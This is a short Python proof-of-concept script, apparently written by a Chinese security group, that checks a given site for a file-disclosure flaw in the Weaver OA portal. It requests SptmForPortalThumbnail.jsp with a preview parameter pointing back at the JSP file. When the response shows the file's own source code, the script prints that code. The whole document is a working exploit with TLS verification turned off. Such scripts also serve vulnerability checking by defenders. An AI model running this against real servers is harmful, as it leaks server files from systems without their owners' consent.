#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import base64
import requests
import urllib3
import sys
import json
import re

urllib3.disable_warnings()

def verify(site):
    burp0_url = site + "/portal/SptmForPortalThumbnail.jsp?preview=portal/SptmForPortalThumbnail.jsp"
    burp0_headers = {"Content-Type": "application/xml"}
    r = requests.get(burp0_url, headers=burp0_headers, verify=False)
    if "weaver.general.BaseBean" in r.text and "getServletConfig" in r.text and r.status_code == 200:
        return r.text
    else:
        return ""


if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，获取 portal/SptmForPortalThumbnail.jsp 的内容为：", info)
    else:
        print("[-]漏洞不存在")
